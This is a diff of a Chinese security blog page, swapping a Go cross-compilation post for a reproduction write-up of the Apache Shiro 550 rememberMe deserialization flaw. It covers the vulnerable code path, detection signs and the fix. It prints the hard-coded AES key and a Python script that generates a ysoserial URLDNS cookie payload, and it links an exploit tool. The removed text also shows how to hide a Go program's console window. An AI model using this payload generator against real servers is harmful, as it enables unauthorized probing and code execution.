@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>go交叉编译 - Cola&#39;S Blog</title>
+  <title>Shiro550漏洞复现 - Cola&#39;S Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -151,9 +151,9 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="go交叉编译">
+            <span class="h2" id="subtitle" title="Shiro550漏洞复现">
               
-                go交叉编译
+                Shiro550漏洞复现
               
             </span>
 
@@ -163,8 +163,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-08-22 20:12" pubdate>
-        2021年8月22日 晚上
+      <time datetime="2021-10-13 10:14" pubdate>
+        2021年10月13日 上午
       </time>
     </span>
   
@@ -175,7 +175,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      394 字
+      567 字
     </span>
   
 
@@ -185,7 +185,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      7
        分钟
     </span>
   
@@ -215,74 +215,76 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">go交叉编译</h1>
+            <h1 style="display: none">Shiro550漏洞复现</h1>
             
             <div class="markdown-body">
-              <h2 id="查看支持架构"><a href="#查看支持架构" class="headerlink" title="查看支持架构"></a>查看支持架构</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">go tool dist list</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>Linux elf</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure>
-
-<p>arm架构</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOARM</span>=7 <span class="hljs-attribute">GOARCH</span>=arm <span class="hljs-attribute">GOOS</span>=linux go build<br></code></pre></td></tr></table></figure>
-
-<p>其中-w为去掉调试信息，-s为去掉符号表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs GOOS">GOOS=linux GOARCH=mips64  go build -ldflags &quot;-s -w&quot; main.go<br></code></pre></td></tr></table></figure>
-
-<p>参数解析</p>
-<p>GOOS：目标操作系统<br>GOARCH：目标操作系统的架构</p>
-<table>
-<thead>
-<tr>
-<th>OS</th>
-<th>ARCH</th>
-<th>OS version</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>linux</td>
-<td>386 / amd64 / arm</td>
-<td>&gt;= Linux 2.6</td>
-</tr>
-<tr>
-<td>darwin</td>
-<td>386 / amd64</td>
-<td>OS X (Snow Leopard + Lion)</td>
-</tr>
-<tr>
-<td>freebsd</td>
-<td>386 / amd64</td>
-<td>&gt;= FreeBSD 7</td>
-</tr>
-<tr>
-<td>windows</td>
-<td>386 / amd64</td>
-<td>&gt;= Windows 2000</td>
-</tr>
-</tbody></table>
-<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p> 在网络上的诸多教程中可能会看到下面的编译命令</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure>
-
-<p>其中CGO_ENABLED=0的意思是使用C语言版本的GO编译器，</p>
-<p>参数配置为0的时候就关闭C语言版本的编译器了。</p>
-<p>自从golang1.5以后go就使用go语言编译器进行编译了。</p>
-<p>在golang1.9当中没有使用CGO_ENABLED参数发现依然可以正常编译。当然使用了也可以正常编译。</p>
-<p>比如把CGO_ENABLED参数设置成1，即在编译的过程当中使用CGO编译器，我发现依然是可以正常编译的。</p>
-<p>实际上如果在go当中使用了C的库，</p>
-<p>比如import “C”默认使用go build的时候就会启动CGO编译器，当然我们可以使用CGO_ENABLED=0来控制go build是否使用CGO编译器。</p>
-<h3 id="隐藏cmd"><a href="#隐藏cmd" class="headerlink" title="隐藏cmd"></a>隐藏cmd</h3><ol>
-<li>通过ldflags，可能会报毒</li>
+              <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>shiro框架可以实现自动登录，当用户选择开启免登录功能时，shiro会自动对用户对象序列化并加密，通过<strong>Set-Cookie: rememberMe</strong>发送给客户端。</p>
+<p>当用户下次访问网站时，如果存在cookie <strong>rememberMe</strong>，在过滤器中会对该字段的值进行解密，来判断是否是合法免登录用户，服务端处理<strong>rememberMe</strong>流程：</p>
+<ol>
+<li>获取rememberMe cookie值</li>
+<li>BASE64解码</li>
+<li>取前16位作为AES解密的IV</li>
+<li>取[16:]作为代解密数据</li>
+<li>通过硬编码密钥<strong>kPH+bIxk5D2deZiIxcaaaA==</strong>+IV使用AES/CBC解密</li>
+<li>反序列化解密后数据</li>
 </ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span>  xxx.<span class="hljs-keyword">go</span> <br></code></pre></td></tr></table></figure>
+<p>因为AES是<strong>硬编码</strong>，导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt;= 1.2.4</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>核心类：</p>
+<ul>
+<li><p>RememberMeManager （接口类，定义了处理rememberMe的接口）</p>
+</li>
+<li><p>AbstractRememberMeManager （实现RememberMeManager接口）</p>
+</li>
+<li><p>CookieRememberMeManager  （AbstractRememberMeManager的子类）</p>
+</li>
+<li><p>JcaCipherService （数据加解密类）</p>
+</li>
+<li><p>DefaultSerializer （序列化/反序列化类）</p>
+</li>
+</ul>
+<p><strong>OncePerRequestFilter</strong>类的<strong>doFilter</strong>方法为shiro过滤器</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/1.png" srcset="/img/loading.gif" lazyload class="">
 
-<ol start="2">
-<li>运行时通过代码实现隐藏</li>
+<p>最后会调用<strong>AbstractRememberMeManager</strong>的<strong>getRememberedPrincipals</strong>方法来处理<strong>rememberMe</strong>的值</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/2.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>调用子类<strong>CookieRememberMeManager</strong>的<strong>getRememberedSerializedIdentity</strong>方法将rememberMe的值进行BASE64解码</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/3.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>调用<strong>convertBytesToPrincipals</strong>方法对base64解码后的数据解密、反序列化</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/4.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>在解密流程中调用了<strong>JcaCipherService</strong>的<strong>decrypt</strong>方法</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/5.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>入参<strong>ciphertext</strong>为解码后的数据，<strong>key</strong>为密钥KEY，硬编码在<strong>AbstractRememberMeManager</strong>类中</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/6.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>最后调用<strong>JcaCipherService</strong>的<strong>crypt</strong>方法完成解密</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/7.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>在<strong>convertBytesToPrincipals</strong>方法中，解密后调用<strong>DefaultSerializer</strong>的<strong>deserialize</strong>方法来反序列化</p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/8.png" srcset="/img/loading.gif" lazyload class="">
+
+
+
+
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级到最新版本</p>
+<p>Apache Shiro 1.2.5版本修复方法就是将默认Key加密改为生成随机的Key加密</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848</a></p>
+ <img src="/2021/10/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/9.png" srcset="/img/loading.gif" lazyload class="">
+
+
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h4 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a>特征判断</h4><ol>
+<li>返回包cookie中存在rememberMe=deleteMe</li>
+<li>返回包cookie中存在rememberMexxxx=deleteMe，相应的请求中的cookie也要设置为rememberMexxxx</li>
 </ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/lxn/win&quot;</span><br><br>win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)<br></code></pre></td></tr></table></figure>
+<h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><h5 id="DNSLOG-payload生成"><a href="#DNSLOG-payload生成" class="headerlink" title="DNSLOG payload生成"></a>DNSLOG payload生成</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(<span class="hljs-string">&quot;http://xx.xxx.xx&quot;</span>)  <span class="hljs-comment">#域名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure>
 
-
-
-<h3 id="去掉符号信息"><a href="#去掉符号信息" class="headerlink" title="去掉符号信息"></a>去掉符号信息</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags <span class="hljs-string">&quot;-s -w&quot;</span><br></code></pre></td></tr></table></figure>
+<h5 id="ShiroExploit"><a href="#ShiroExploit" class="headerlink" title="ShiroExploit"></a>ShiroExploit</h5><p><a target="_blank" rel="noopener" href="https://github.com/KpLi0rn/ShiroExploit">https://github.com/KpLi0rn/ShiroExploit</a></p>
 
             </div>
             <hr>
@@ -292,7 +294,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/go/">go</a>
+                      <a class="hover-with-bg" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
                     
                   </div>
                 
@@ -300,7 +302,9 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/go/">go</a>
+                      <a class="hover-with-bg" href="/tags/shiro/">shiro</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
                     
                   </div>
                 
@@ -311,9 +315,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/">
+                      <a href="/2021/10/13/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ReactNative分析</span>
+                        <span class="hidden-mobile">URLDNS利用链</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -321,8 +325,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/08/22/flutter%E7%BC%96%E8%AF%91release%E7%89%88%E6%9C%AC/">
-                        <span class="hidden-mobile">flutter编译release版本</span>
+                      <a href="/2021/08/25/frida%E6%95%99%E7%A8%8B/">
+                        <span class="hidden-mobile">frida教程</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
